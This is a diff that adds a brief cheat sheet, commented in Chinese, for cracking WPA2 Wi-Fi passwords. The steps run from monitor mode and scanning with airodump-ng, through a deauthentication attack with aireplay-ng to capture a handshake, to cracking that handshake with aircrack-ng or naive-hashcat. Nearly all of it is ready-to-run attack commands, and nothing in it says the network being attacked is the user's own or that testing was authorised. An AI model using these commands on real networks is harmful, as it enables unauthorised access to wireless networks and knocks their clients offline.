@@ -1,0 +1,8 @@
+1.airmon-ng start wlan1//打开监听模式
+2.airodump-ng wlan1mon//扫描wifi
+3.airodump-ng -c CH --bssid destMac -w 要保存的形式 wlan1mon//开始抓包
+4.aireplay-ng -0 2 -a serverMac -c clientMac wlan1mon//主动攻击模式
+5.得到handShake后再破解
+A.aircrack-ng -w wordlist -a2(present wpa2) -b Mac *.cap
+B.naive-hash:HASH_FILE=hackme.hccapx POT_FILE=hackme.pot HASH_TYPE=2500 ./naive-hashcat.sh
+
